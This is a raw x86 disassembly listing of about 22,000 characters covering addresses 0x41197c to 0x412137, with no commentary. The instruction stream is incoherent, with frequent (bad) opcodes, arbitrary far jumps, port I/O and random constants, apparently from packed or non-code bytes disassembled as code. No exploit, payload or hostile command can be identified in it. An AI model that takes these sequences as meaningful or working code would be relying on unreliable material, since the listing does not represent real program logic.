  41197c:	xchg   DWORD PTR [ebp-0x7aed9df5],ebx
  411982:	xchg   DWORD PTR [ecx-0x7d7d21b3],ebp
  411988:	lock sbb dl,BYTE PTR [edi-0x78]
  41198c:	retf   
  41198d:	sub    BYTE PTR [ebp+0x651799ca],ah
  411993:	lods   al,BYTE PTR ds:[esi]
  411994:	lods   al,BYTE PTR ds:[esi]
  411995:	push   esp
  411996:	sub    BYTE PTR [esi-0x9160c4d],al
  41199c:	push   esi
  41199d:	and    dl,BYTE PTR [ecx-0x65]
  4119a0:	clc    
  4119a1:	mov    esi,0xf39c59a9
  4119a6:	imul   eax,DWORD PTR [esi],0x3a
  4119a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119aa:	gs leave 
  4119ac:	add    ebp,DWORD PTR [edi+eax*2+0x42]
  4119b0:	xor    edi,DWORD PTR [ecx-0x19443962]
  4119b6:	aam    0x96
  4119b8:	addr16 pushf 
  4119ba:	es aad 0x9
  4119bd:	cmp    al,0x6d
  4119bf:	out    dx,al
  4119c0:	in     al,0xbc
  4119c2:	dec    esi
  4119c3:	inc    esi
  4119c4:	aaa    
  4119c5:	push   esp
  4119c6:	and    ch,BYTE PTR [esi]
  4119c8:	jp     0x411978
  4119ca:	neg    DWORD PTR [ebx+0x68]
  4119cd:	rol    DWORD PTR [ebx-0x6110a19a],cl
  4119d3:	loopne 0x4119ba
  4119d5:	xchg   edi,eax
  4119d6:	lock mov cl,0xfb
  4119d9:	sbb    esi,0x1f
  4119dc:	(bad)  
  4119dd:	jg     0x4119f3
  4119df:	ds pop ss
  4119e1:	cmp    BYTE PTR [ecx+0x1630e82a],bh
  4119e7:	pop    ds
  4119e8:	mov    esi,0xa1d5afc4
  4119ed:	adc    eax,0xc74d6368
  4119f2:	adc    DWORD PTR [ebx-0x205846bb],ebx
  4119f8:	and    ebx,esp
  4119fa:	or     DWORD PTR [ebx],0x85b6713f
  411a00:	sub    BYTE PTR [eax-0x75c091b1],al
  411a06:	mov    ds:0x73305057,al
  411a0b:	neg    dl
  411a0d:	fild   DWORD PTR [eax+0x63]
  411a10:	rol    DWORD PTR [esi-0x37],1
  411a13:	pop    edi
  411a14:	neg    BYTE PTR [edx-0x3180c88e]
  411a1a:	arpl   WORD PTR [ecx],cx
  411a1c:	mov    al,ds:0x61810057
  411a21:	adc    ebx,DWORD PTR [edi+0x618395a8]
  411a27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a28:	shl    DWORD PTR [edx+0x7fb1e47c],1
  411a2e:	mov    BYTE PTR [esi-0x6f0fcc16],bh
  411a34:	jmp    0x168d:0x395005b6
  411a3b:	outs   dx,DWORD PTR ds:[esi]
  411a3c:	cmp    BYTE PTR [ecx-0x73],0xa6
  411a40:	in     eax,0x85
  411a42:	fwait
  411a43:	sub    BYTE PTR [esi],cl
  411a45:	xor    al,0xd3
  411a47:	cli    
  411a48:	pop    edi
  411a49:	jecxz  0x411a8d
  411a4b:	xor    al,0xf2
  411a4d:	in     eax,dx
  411a4e:	dec    esi
  411a4f:	(bad)  ds:0x3d15ce59
  411a55:	popf   
  411a56:	(bad)  
  411a57:	call   0xbda7b013
  411a5c:	aas    
  411a5d:	dec    ebx
  411a5e:	sub    esp,DWORD PTR [ecx]
  411a60:	or     BYTE PTR [eax+edx*8],0x6c
  411a64:	mov    dl,0xb7
  411a66:	les    ebp,FWORD PTR [bx+si]
  411a69:	sbb    DWORD PTR [ebp-0x65414a94],edx
  411a6f:	nop
  411a70:	cmp    DWORD PTR [eax-0x46],edx
  411a73:	fistp  WORD PTR [edi-0x317e0d4d]
  411a79:	fiadd  WORD PTR [ebx+0x64]
  411a7c:	push   edx
  411a7d:	pop    ebx
  411a7e:	mov    eax,ds:0xc4325702
  411a83:	dec    ecx
  411a84:	cmp    DWORD PTR [eax],esi
  411a86:	sbb    DWORD PTR [edi-0x7eb933f],ebp
  411a8c:	inc    ecx
  411a8d:	pop    ebx
  411a8e:	mov    ds:0x727bd348,al
  411a93:	nop
  411a94:	jno    0x411a1a
  411a96:	cmc    
  411a97:	xlat   BYTE PTR ds:[ebx]
  411a98:	stos   BYTE PTR es:[edi],al
  411a99:	(bad)  
  411a9a:	rol    ch,cl
  411a9c:	mov    eax,ds:0xefce01f7
  411aa1:	or     esp,DWORD PTR [eax+0x4]
  411aa4:	bsf    ebx,DWORD PTR [eax+ecx*8]
  411aa8:	repnz mov bh,0x89
  411aab:	mul    BYTE PTR [ecx-0x75]
  411aae:	and    dl,BYTE PTR [ebp+0x2fe9154e]
  411ab4:	pop    esp
  411ab5:	dec    esp
  411ab6:	mov    eax,0xab99fc04
  411abb:	popa   
  411abc:	mov    ebp,0x7a22ab5a
  411ac1:	lahf   
  411ac2:	les    ecx,FWORD PTR [eax+0x3d]
  411ac5:	ss clc 
  411ac7:	(bad)  [ebx+0x5e]
  411aca:	sbb    dh,ch
  411acc:	add    DWORD PTR [eax-0x5e],esi
  411acf:	(bad)  [edi]
  411ad1:	mov    ds:0x9f776f4a,eax
  411ad6:	mov    esp,0xc2b589df
  411adb:	pop    edi
  411adc:	or     DWORD PTR [esi+0x7],ebx
  411adf:	adc    eax,0xd95315b
  411ae4:	sti    
  411ae5:	mov    ecx,DWORD PTR [ebx+0x4a]
  411ae8:	mov    eax,ds:0xb083e609
  411aed:	dec    ah
  411aef:	cmp    ecx,DWORD PTR [edx-0x4b]
  411af2:	push   ss
  411af3:	mov    WORD PTR [ecx+0x14740f2a],?
  411af9:	push   ebp
  411afa:	pop    ebp
  411afb:	xchg   ecx,eax
  411afc:	scas   eax,DWORD PTR es:[edi]
  411afd:	addr16 int 0x14
  411b00:	call   0x7af438c7
  411b05:	xor    dh,BYTE PTR [ebx+0x36]
  411b08:	cmp    al,0x4
  411b0a:	(bad)  
  411b0c:	cmp    eax,0x3c8f1aa
  411b11:	mov    ch,0x57
  411b13:	inc    eax
  411b14:	xor    ebp,DWORD PTR [eax]
  411b16:	mov    esp,0xd093d115
  411b1b:	repz imul ecx,DWORD PTR [ecx+edx*8+0x2c0b311e],0xe3eff363
  411b27:	repz scas al,BYTE PTR es:[edi]
  411b29:	xor    al,0xa8
  411b2b:	push   0x1531123c
  411b30:	sbb    BYTE PTR [ecx+0x53],ah
  411b33:	(bad)  
  411b34:	cmp    al,0x1a
  411b36:	mov    ds,WORD PTR [ebp+0x53c24341]
  411b3c:	inc    edi
  411b3d:	push   ss
  411b3e:	(bad)  
  411b3f:	jno    0x411b39
  411b41:	sbb    eax,0xda4d7b76
  411b46:	or     bh,BYTE PTR [esi+eiz*1+0x5c086d78]
  411b4d:	sbb    al,0x26
  411b4f:	ins    BYTE PTR es:[edi],dx
  411b50:	dec    ecx
  411b51:	mov    ds:0x73abd2c7,al
  411b56:	mov    ds:0x19497c9a,al
  411b5b:	inc    edi
  411b5c:	scas   eax,DWORD PTR es:[edi]
  411b5d:	fsub   DWORD PTR [edi]
  411b5f:	inc    eax
  411b60:	jmp    0x9c78:0x48d882fe
  411b67:	cmp    al,0x3b
  411b69:	ret    
  411b6a:	and    edx,DWORD PTR [ecx-0x6181412a]
  411b70:	sub    BYTE PTR [ebp-0x7f],bl
  411b73:	int3   
  411b74:	jnp    0x411b97
  411b76:	shr    BYTE PTR [ebp-0x3dfdf072],0x95
  411b7d:	jb     0x411baa
  411b7f:	push   cs
  411b80:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b82:	outs   dx,BYTE PTR ds:[esi]
  411b83:	or     bl,ah
  411b85:	lock call 0xbc58:0x18b3dc52
  411b8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b8e:	xor    al,0x1b
  411b90:	pop    ds
  411b91:	push   0x3d
  411b93:	xchg   ebx,eax
  411b94:	and    ebp,ebp
  411b96:	ds jmp 0x2184:0xd572539
  411b9e:	mov    bh,0x16
  411ba0:	bound  edi,QWORD PTR [esi]
  411ba2:	in     eax,0x8e
  411ba4:	imul   esp,DWORD PTR [ecx+0x3a83333c],0x21
  411bab:	inc    ecx
  411bac:	cmp    eax,0xd8541319
  411bb1:	pushf  
  411bb2:	adc    BYTE PTR [ebp+0x31],cl
  411bb5:	int3   
  411bb6:	hlt    
  411bb7:	retf   0xf71
  411bba:	cdq    
  411bbb:	in     al,dx
  411bbc:	fimul  DWORD PTR [ebp-0x56eccddb]
  411bc2:	in     al,dx
  411bc3:	retf   0xa3a8
  411bc6:	jg     0x411be8
  411bc8:	lods   al,BYTE PTR ds:[esi]
  411bc9:	dec    esp
  411bca:	mov    bh,0x13
  411bcc:	dec    ecx
  411bcd:	mov    edx,0x23643068
  411bd2:	adc    ax,0x36
  411bd6:	in     al,dx
  411bd7:	adc    DWORD PTR [ebp+edx*2-0x1a3ccbd0],eax
  411bde:	cmp    eax,0xafe4c38a
  411be3:	sbb    ah,cl
  411be5:	lods   eax,DWORD PTR ds:[esi]
  411be6:	in     eax,0x58
  411be8:	ins    BYTE PTR es:[edi],dx
  411be9:	adc    eax,0x555aaca9
  411bee:	in     eax,dx
  411bef:	inc    eax
  411bf0:	mov    DWORD PTR [ebx],ecx
  411bf2:	pop    edx
  411bf3:	mov    ds:0x9b73e69e,eax
  411bf8:	push   eax
  411bf9:	mov    esi,DWORD PTR [edx+ebx*4]
  411bfc:	mov    fs,WORD PTR [eax+0x6d]
  411bff:	or     al,0xf8
  411c01:	ret    0x4dc2
  411c04:	and    eax,0x12e56a53
  411c09:	ss aas 
  411c0b:	mov    DWORD PTR [ecx+0xc],edi
  411c0e:	and    al,0xf6
  411c10:	pop    ebp
  411c11:	ret    
  411c12:	pop    ecx
  411c13:	dec    edi
  411c14:	loope  0x411b96
  411c16:	push   esp
  411c17:	(bad)  
  411c19:	or     edx,DWORD PTR [eax-0x1fe2ea76]
  411c1f:	cmp    DWORD PTR [eax+ebx*8+0x2876bcec],esi
  411c26:	scas   al,BYTE PTR es:[edi]
  411c27:	(bad)
  411c2a:	or     DWORD PTR [edi+0x34],edi
  411c2d:	jbe    0x411bfe
  411c2f:	mov    ch,0x6
  411c31:	imul   esp,DWORD PTR [ebp-0x2d1e3f0f],0xd6ea4784
  411c3b:	outs   dx,DWORD PTR ds:[esi]
  411c3c:	inc    edi
  411c3d:	in     eax,0xb2
  411c3f:	int3   
  411c40:	pusha  
  411c41:	inc    ebp
  411c42:	xchg   ebx,eax
  411c43:	ds cmp ch,ch
  411c46:	mov    cl,0x8a
  411c48:	jbe    0x411c39
  411c4a:	jg     0x411cca
  411c4c:	retf   
  411c4d:	jns    0x411c44
  411c4f:	mov    ebp,DWORD PTR [edi-0x6c]
  411c52:	jecxz  0x411c80
  411c54:	fisttp WORD PTR [eax+0x2ce73c01]
  411c5a:	jae    0x411cb3
  411c5c:	pop    edi
  411c5d:	mov    BYTE PTR [ebx-0x53],ch
  411c60:	dec    edi
  411c61:	int3   
  411c62:	scas   eax,DWORD PTR es:[edi]
  411c63:	xor    esp,edi
  411c65:	(bad)
  411c69:	adc    BYTE PTR [edx],0x31
  411c6c:	fwait
  411c6d:	cdq    
  411c6e:	xchg   esi,eax
  411c6f:	cmp    eax,DWORD PTR [edi-0x7b4565b0]
  411c75:	adc    eax,0x9953b5eb
  411c7a:	cdq    
  411c7b:	mov    ebp,0xb5918886
  411c80:	mov    dh,0xd7
  411c82:	mov    BYTE PTR [edi],dh
  411c84:	cld    
  411c85:	dec    ebx
  411c86:	out    0x5e,al
  411c88:	xchg   ebx,eax
  411c89:	mov    edx,0x51696cb7
  411c8e:	add    eax,0xa8c302ba
  411c93:	aaa    
  411c94:	ss push ecx
  411c96:	cdq    
  411c97:	pop    ds
  411c98:	inc    esp
  411c99:	sbb    ebx,DWORD PTR [edi-0x6201db8c]
  411c9f:	in     al,dx
  411ca0:	and    al,0x7f
  411ca2:	fcom   DWORD PTR [edx-0x70]
  411ca5:	imul   edi,DWORD PTR [ebp+0x782fb0e5],0x7f036ae7
  411caf:	cld    
  411cb0:	fs sub dh,bh
  411cb3:	and    eax,0xbcbe9d41
  411cb8:	sub    ebp,DWORD PTR [edx-0x28595e89]
  411cbe:	fwait
  411cbf:	sub    DWORD PTR [eax-0x46],ecx
  411cc2:	xor    eax,0x381f9f50
  411cc7:	cmp    eax,0xb462ffd5
  411ccc:	out    dx,eax
  411ccd:	xlat   BYTE PTR ds:[ebx]
  411cce:	inc    ebx
  411ccf:	xchg   esp,eax
  411cd0:	mov    esp,0x50c1d67e
  411cd5:	or     eax,0x523bc814
  411cda:	xchg   edi,eax
  411cdb:	frstor [eax+0x6a]
  411cde:	icebp  
  411cdf:	or     al,0x9a
  411ce1:	cwde   
  411ce2:	into   
  411ce3:	stos   BYTE PTR es:[edi],al
  411ce4:	pop    esi
  411ce5:	pop    ebp
  411ce6:	popa   
  411ce7:	cmp    dl,ch
  411ce9:	dec    ebp
  411cea:	or     al,0xa3
  411cec:	sub    DWORD PTR [ebp-0x3c],ebx
  411cef:	sub    al,0x2e
  411cf1:	inc    ebp
  411cf2:	clc    
  411cf3:	out    dx,eax
  411cf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cf5:	jmp    0xae17d055
  411cfa:	pop    ebp
  411cfb:	push   ds
  411cfc:	std    
  411cfd:	sar    ah,1
  411cff:	jnp    0x411d37
  411d01:	pop    esp
  411d02:	dec    edi
  411d03:	ret    0x6afc
  411d06:	arpl   bp,bp
  411d08:	ins    DWORD PTR es:[edi],dx
  411d09:	int3   
  411d0a:	push   ecx
  411d0b:	jae    0x411cea
  411d0d:	retf   0xd2a3
  411d10:	call   0x96c666cc
  411d15:	and    BYTE PTR [edx-0x1e1589c2],dl
  411d1b:	dec    ebp
  411d1c:	adc    edx,DWORD PTR [ecx+0x48]
  411d1f:	hlt    
  411d20:	mov    eax,ds:0xfcd27102
  411d25:	mov    ebx,0xedd4f3c9
  411d2a:	xchg   edi,eax
  411d2b:	call   0x5e1574cb
  411d30:	hlt    
  411d31:	(bad)  [edi]
  411d33:	aaa    
  411d34:	in     al,0xfd
  411d36:	cwde   
  411d37:	dec    eax
  411d38:	mov    bh,0x8f
  411d3a:	mov    bl,0xb
  411d3c:	in     al,dx
  411d3d:	jns    0x411d9d
  411d3f:	fcmovu st,st(2)
  411d41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d42:	arpl   WORD PTR [edx],di
  411d44:	or     esp,edi
  411d46:	cmc    
  411d47:	add    dh,dl
  411d49:	in     eax,0xff
  411d4b:	cwde   
  411d4c:	dec    esi
  411d4d:	push   cs
  411d4e:	xor    DWORD PTR [esi+0x37cabf8b],esi
  411d54:	jl     0x411d8f
  411d56:	pusha  
  411d57:	pop    ecx
  411d58:	push   0x67
  411d5a:	inc    ebx
  411d5b:	js     0x411d9f
  411d5d:	imul   BYTE PTR [esi-0x18c5e595]
  411d63:	cmp    edi,ebx
  411d65:	mov    eax,ecx
  411d67:	xor    eax,0x6feb5d55
  411d6c:	mov    ds:0x237c968e,eax
  411d71:	or     al,0xb5
  411d73:	in     eax,dx
  411d74:	pop    edx
  411d75:	xor    eax,eax
  411d77:	sub    BYTE PTR [ecx*4+0x41781542],cl
  411d7e:	(bad)  
  411d7f:	aam    0xa8
  411d81:	push   ss
  411d82:	jmp    0x411d15
  411d84:	ret    
  411d85:	rol    DWORD PTR [edx-0x3dc31b1d],1
  411d8b:	add    DWORD PTR [ecx],esi
  411d8d:	dec    esp
  411d8e:	test   BYTE PTR [esi],cl
  411d90:	cs jmp 0x411ddf
  411d93:	lods   eax,DWORD PTR ds:[esi]
  411d94:	arpl   WORD PTR [ebx+0x49],cx
  411d97:	lahf   
  411d98:	(bad)  
  411d99:	ds push 0x417e21a2
  411d9f:	adc    ebp,DWORD PTR [ebx-0x6f6b2f43]
  411da5:	fwait
  411da6:	test   al,0x84
  411da8:	inc    esi
  411da9:	jns    0x411de6
  411dab:	add    ebx,ebx
  411dad:	out    0x8,al
  411daf:	mov    gs,WORD PTR [ebx]
  411db1:	scas   eax,DWORD PTR es:[edi]
  411db2:	xchg   ebp,eax
  411db3:	adc    eax,0xb5070f9c
  411db8:	mov    eax,ds:0x4ff6de29
  411dbd:	out    dx,al
  411dbe:	and    DWORD PTR [ebx],0x27
  411dc1:	sub    dl,bl
  411dc3:	cld    
  411dc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411dc5:	test   al,0xf9
  411dc7:	or     edx,ebx
  411dc9:	fdiv   DWORD PTR [edx+ecx*8-0x64e7e9ac]
  411dd0:	imul   DWORD PTR [ebx+0xa1eddbe]
  411dd6:	mov    cl,0x40
  411dd8:	in     eax,dx
  411dd9:	add    DWORD PTR [eax],ebp
  411ddb:	lahf   
  411ddc:	js     0x411e3c
  411dde:	mov    ecx,0xd07bb775
  411de3:	out    0x33,eax
  411de5:	fcmovnb st,st(3)
  411de7:	xchg   DWORD PTR [edi],edi
  411de9:	pop    edi
  411dea:	mov    esp,0xe66c0028
  411def:	ror    BYTE PTR [eax-0x6bd21362],1
  411df5:	pusha  
  411df6:	adc    dl,BYTE PTR [esi]
  411df8:	push   edx
  411df9:	mov    ch,0xa1
  411dfb:	mov    ecx,0x1b14d0f4
  411e00:	xchg   ecx,eax
  411e01:	(bad)  
  411e02:	aad    0x8a
  411e04:	pop    ebx
  411e05:	mov    cl,0x13
  411e07:	xchg   ebx,eax
  411e08:	pop    eax
  411e09:	outs   dx,DWORD PTR ds:[esi]
  411e0a:	aas    
  411e0b:	imul   edx,esi,0xbd3cadea
  411e11:	fidivr DWORD PTR [ebx+ebp*8+0x65]
  411e15:	call   0xbf55f0b6
  411e1a:	xor    DWORD PTR ds:0xc3921684,ebp
  411e20:	data16 mov bh,0xa
  411e23:	sbb    esi,eax
  411e25:	xchg   esi,eax
  411e26:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e28:	out    dx,eax
  411e29:	xor    DWORD PTR [ebx],esp
  411e2b:	push   ebx
  411e2c:	dec    esi
  411e2d:	hlt    
  411e2e:	nop
  411e2f:	dec    BYTE PTR [edx]
  411e31:	into   
  411e32:	adc    al,0xb0
  411e34:	stos   BYTE PTR es:[edi],al
  411e35:	or     eax,0xbaee6963
  411e3a:	push   es
  411e3b:	push   es
  411e3c:	div    dh
  411e3e:	push   esi
  411e3f:	and    eax,0x15c66b09
  411e44:	sahf   
  411e45:	pop    ds
  411e46:	mov    eax,ds:0x76beff7b
  411e4b:	in     al,0xc3
  411e4d:	push   ds
  411e4e:	mov    esp,0x8f6cf1bd
  411e53:	ret    
  411e54:	ret    
  411e55:	lds    eax,FWORD PTR [edx]
  411e57:	dec    esi
  411e58:	mov    esi,DWORD PTR [ebx+0x36]
  411e5b:	cli    
  411e5c:	test   al,0x7e
  411e5e:	mov    dl,0xc6
  411e60:	adc    BYTE PTR [edi+eax*8-0x40],cl
  411e64:	aad    0x70
  411e66:	(bad)
  411e6a:	cmp    DWORD PTR [esi-0x1a],ebp
  411e6d:	mov    eax,ds:0xd9b19a23
  411e72:	inc    edx
  411e73:	hlt    
  411e74:	cli    
  411e75:	jo     0x411ef2
  411e77:	arpl   WORD PTR [edi-0x7f4ec87],di
  411e7d:	inc    esi
  411e7e:	(bad)  
  411e7f:	pop    esi
  411e80:	jns    0x411e32
  411e82:	scas   al,BYTE PTR es:[edi]
  411e83:	push   ebp
  411e84:	sub    al,0x65
  411e86:	out    0x40,eax
  411e88:	mov    ch,0x93
  411e8a:	mov    eax,0xc465dcf7
  411e8f:	idiv   ebp
  411e91:	std    
  411e92:	hlt    
  411e93:	cmc    
  411e94:	add    BYTE PTR [edx+0x5c2e85b2],ch
  411e9a:	ja     0x411e2c
  411e9c:	add    al,0x54
  411e9e:	loope  0x411ece
  411ea0:	int3   
  411ea1:	mov    cl,0xae
  411ea3:	jg     0x411f14
  411ea5:	add    al,0x18
  411ea7:	fdiv   st(1),st
  411ea9:	push   0xffffffcb
  411eab:	cmp    esp,0xc4403060
  411eb1:	push   esp
  411eb2:	cdq    
  411eb3:	bound  edx,QWORD PTR [esi]
  411eb5:	sub    eax,0xfaac059c
  411eba:	adc    BYTE PTR gs:[ecx],bh
  411ebd:	xchg   edx,eax
  411ebe:	pushf  
  411ebf:	out    dx,al
  411ec0:	aad    0x9
  411ec2:	clc    
  411ec3:	adc    DWORD PTR [esi],ebp
  411ec5:	add    ebp,esi
  411ec7:	adc    bh,ch
  411ec9:	je     0x411f0f
  411ecb:	mov    dh,0x9a
  411ecd:	(bad)  
  411ece:	cld    
  411ecf:	mov    ecx,0xf10cab73
  411ed4:	mov    ds:0x866a9f13,al
  411ed9:	cmp    DWORD PTR [ebp+0x15ca963e],ebp
  411edf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ee0:	or     ebx,ecx
  411ee2:	fcomp  QWORD PTR [esi+esi*8+0x10]
  411ee6:	mov    dh,0xec
  411ee8:	xchg   ebx,eax
  411ee9:	loope  0x411f13
  411eeb:	pop    esp
  411eec:	sub    al,0x1c
  411eee:	ja     0x411ecb
  411ef0:	or     eax,0x439585fc
  411ef5:	loopne 0x411f5d
  411ef7:	sub    eax,0x2acc4022
  411efc:	xchg   ebp,eax
  411efd:	pop    esi
  411efe:	sub    BYTE PTR [esi],bl
  411f00:	outs   dx,DWORD PTR ds:[esi]
  411f01:	lods   al,BYTE PTR ds:[esi]
  411f02:	mov    al,0x74
  411f04:	mov    esp,0x30d4df39
  411f09:	cmp    ebp,esp
  411f0b:	in     eax,0x8c
  411f0d:	ud0    eax,ecx
  411f10:	add    ah,cl
  411f12:	shl    DWORD PTR [edi-0x235fe8ac],1
  411f18:	adc    dl,al
  411f1a:	and    al,0xc9
  411f1c:	aam    0x35
  411f1e:	cmp    eax,DWORD PTR [eax-0x6c]
  411f21:	in     al,0xec
  411f23:	std    
  411f24:	in     al,dx
  411f25:	enter  0xcad,0xae
  411f29:	aad    0x12
  411f2b:	call   0x6dcb:0xd672ee92
  411f32:	jno    0x411f73
  411f34:	mov    eax,ds:0x303f9937
  411f39:	push   0xffffffc7
  411f3b:	rcl    BYTE PTR [esi-0x6c642707],cl
  411f41:	cli    
  411f42:	popf   
  411f43:	sub    DWORD PTR [ebx+0x75394992],ebx
  411f49:	sub    BYTE PTR [esi],0x65
  411f4c:	adc    al,dl
  411f4e:	push   ecx
  411f4f:	pushw  ds
  411f51:	jmp    0xbad:0x44519304
  411f58:	repnz pop ss
  411f5a:	(bad)  
  411f5b:	inc    esi
  411f5c:	cld    
  411f5d:	leave  
  411f5e:	push   ecx
  411f5f:	inc    esi
  411f60:	cwde   
  411f61:	add    BYTE PTR [ebx-0x62],0xcb
  411f65:	adc    al,BYTE PTR ss:[ebx+0x1df5b6b9]
  411f6c:	add    ch,BYTE PTR [ebp-0x2a285fa7]
  411f72:	pop    DWORD PTR [ebp+0x4b]
  411f75:	mov    ecx,0xe5984c85
  411f7a:	in     al,0x40
  411f7c:	fsub   DWORD PTR [ecx]
  411f7e:	cmp    al,0xb0
  411f80:	icebp  
  411f81:	sbb    al,0xce
  411f83:	icebp  
  411f84:	shl    ebp,1
  411f86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f87:	push   ebx
  411f88:	mov    ecx,ds
  411f8a:	push   es
  411f8b:	sub    DWORD PTR [eax-0x4e8202e0],0xffffff9d
  411f92:	mov    edi,0x8e29e682
  411f97:	retfw  
  411f99:	xor    eax,0xc2e1e264
  411f9e:	cmp    DWORD PTR [eax+0x230c408c],edx
  411fa4:	adc    edi,esi
  411fa6:	fnstenv [ebx-0x264799b]
  411fac:	rcl    DWORD PTR [ebp-0x5a],0xf6
  411fb0:	push   0x7c8a981f
  411fb5:	mov    DWORD PTR [edx],ecx
  411fb7:	fidiv  WORD PTR [ecx*1-0x6fbdba3d]
  411fbe:	icebp  
  411fbf:	sar    BYTE PTR [ebp-0x7aeeffb3],cl
  411fc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fc6:	ins    BYTE PTR es:[edi],dx
  411fc7:	sub    ebx,DWORD PTR [ecx-0x46296468]
  411fcd:	mov    edx,0xfc12abcf
  411fd2:	mov    ebx,0x87a9b5b9
  411fd7:	div    DWORD PTR [eax-0x73]
  411fda:	sub    BYTE PTR ds:0xfa03f523,0xd1
  411fe1:	xor    BYTE PTR [edi+ebp*4],bl
  411fe4:	and    al,0x78
  411fe6:	sub    BYTE PTR [eax],cl
  411fe8:	bound  edx,QWORD PTR [ebp+eiz*4-0x4ebbe4a0]
  411fef:	or     edx,esi
  411ff1:	fsubr  st,st(6)
  411ff3:	mov    ch,0x25
  411ff5:	push   ecx
  411ff6:	arpl   WORD PTR [esi+0x26],ax
  411ff9:	mov    al,ds:0x418f19f1
  411ffe:	jmp    0xc202319e
  412003:	jecxz  0x412034
  412005:	xlat   BYTE PTR ds:[ebx]
  412006:	stos   BYTE PTR es:[edi],al
  412007:	stos   BYTE PTR es:[edi],al
  412008:	sbb    al,BYTE PTR [esi]
  41200a:	out    0x72,al
  41200c:	and    DWORD PTR [ebx+ebx*1-0x97dccf3],ebp
  412013:	pop    ebx
  412014:	dec    edi
  412015:	mov    ebp,0xd1b69382
  41201a:	test   al,0xc4
  41201c:	inc    eax
  41201d:	and    ebx,esi
  41201f:	sbb    eax,0xbbac6691
  412024:	jecxz  0x412082
  412026:	and    edx,DWORD PTR [edi+ecx*2+0x392c2281]
  41202d:	pop    ss
  41202e:	cmp    al,0x64
  412030:	adc    dh,dh
  412032:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412033:	inc    eax
  412034:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412035:	cli    
  412036:	mov    BYTE PTR [ebx],cl
  412038:	adc    esi,DWORD PTR [eax]
  41203a:	icebp  
  41203b:	call   0xc02:0x5b5aaad2
  412042:	push   edx
  412043:	mov    edx,0xe921df3c
  412048:	das    
  412049:	mov    ds:0x8231b72c,al
  41204e:	mov    edi,0x15cd7682
  412053:	dec    ebx
  412054:	scas   al,BYTE PTR es:[edi]
  412055:	sub    DWORD PTR [esi-0x2f],eax
  412058:	sbb    edx,ebx
  41205a:	and    edx,DWORD PTR [edi+esi*8-0xd]
  41205e:	inc    ecx
  41205f:	pop    esp
  412060:	loopne 0x412039
  412062:	xchg   DWORD PTR [edi],ecx
  412064:	fwait
  412065:	fs adc eax,eax
  412068:	je     0x412019
  41206a:	dec    esi
  41206b:	ds scas al,BYTE PTR es:[edi]
  41206d:	lds    edx,FWORD PTR [ecx]
  41206f:	(bad)  
  412070:	mov    ch,0xe3
  412072:	aam    0x28
  412074:	(bad)  
  412075:	cmp    DWORD PTR [ebx-0x6601a677],edx
  41207b:	dec    eax
  41207c:	jecxz  0x4120b4
  41207e:	and    DWORD PTR [ecx-0x117fbde1],eax
  412084:	lahf   
  412085:	fadd   QWORD PTR [ebx]
  412087:	cmp    esp,DWORD PTR [ebp-0x69]
  41208a:	xor    ch,dh
  41208c:	add    ebp,DWORD PTR [edx+ebx*8]
  41208f:	shl    DWORD PTR [eax-0x1e],1
  412092:	jno    0x4120ad
  412094:	cmp    ah,ah
  412096:	sbb    esp,esi
  412098:	jmp    esp
  41209a:	mov    bl,0x3c
  41209c:	dec    BYTE PTR [ebp+0x4f]
  41209f:	popf   
  4120a0:	mov    bh,0xe1
  4120a2:	or     al,0xf9
  4120a4:	push   edx
  4120a5:	inc    esp
  4120a6:	scas   eax,DWORD PTR es:[edi]
  4120a7:	sub    al,0xd0
  4120a9:	ds popa 
  4120ab:	sar    dl,1
  4120ad:	arpl   WORD PTR [eax-0x50d5cca],si
  4120b3:	fdivr  DWORD PTR [ebx]
  4120b5:	das    
  4120b6:	aam    0x36
  4120b8:	fdivr  DWORD PTR [eax-0x32]
  4120bb:	jno    0x41206c
  4120bd:	pop    esi
  4120be:	push   es
  4120bf:	jbe    0x412122
  4120c1:	ss mov dl,0x8
  4120c4:	shl    BYTE PTR [edi-0x1c],cl
  4120c7:	push   0x77
  4120c9:	lock dec edx
  4120cb:	push   ebp
  4120cc:	fidivr WORD PTR [edi+0x71]
  4120cf:	mov    esp,0x42f24838
  4120d4:	rcr    DWORD PTR [edx],1
  4120d6:	xor    al,0x97
  4120d8:	jge    0x4120c5
  4120da:	xchg   ebx,eax
  4120db:	pop    esi
  4120dc:	jmp    0x412133
  4120de:	ret    0xcdcf
  4120e1:	cmp    DWORD PTR [esi+0x57eb998c],esi
  4120e7:	push   es
  4120e8:	xchg   esp,eax
  4120e9:	fsub   QWORD PTR [ebx+0x57]
  4120ec:	sub    esp,DWORD PTR [edx]
  4120ee:	cmp    al,al
  4120f0:	in     al,dx
  4120f1:	stos   BYTE PTR es:[edi],al
  4120f2:	js     0x41212d
  4120f4:	mov    ch,0xe1
  4120f6:	xor    eax,0xda4b9e0e
  4120fb:	push   ss
  4120fc:	into   
  4120fd:	mov    BYTE PTR [ebx],dl
  4120ff:	popa   
  412100:	rcl    DWORD PTR [ebp-0x58],0xb0
  412104:	iret   
  412105:	mov    esi,cs
  412107:	sub    dh,BYTE PTR [eax+0x52]
  41210a:	cmp    eax,0xced6e615
  41210f:	mov    esp,0x10a96349
  412114:	push   esp
  412115:	aad    0xb
  412117:	jb     0x4120fa
  412119:	outs   dx,BYTE PTR ds:[esi]
  41211a:	and    al,0xf7
  41211c:	pushf  
  41211d:	mov    ebx,0x29b9801a
  412122:	mov    DWORD PTR [ecx+0x745c228],esi
  412128:	out    0x64,eax
  41212a:	sbb    edi,DWORD PTR [ebx]
  41212c:	out    dx,eax
  41212d:	add    BYTE PTR [ebx],dh
  41212f:	fnstsw ax
  412131:	jmp    0x4120c2
  412133:	sub    al,0x11
  412135:	in     eax,dx
  412136:	xchg   esp,eax
  412137:	iret   
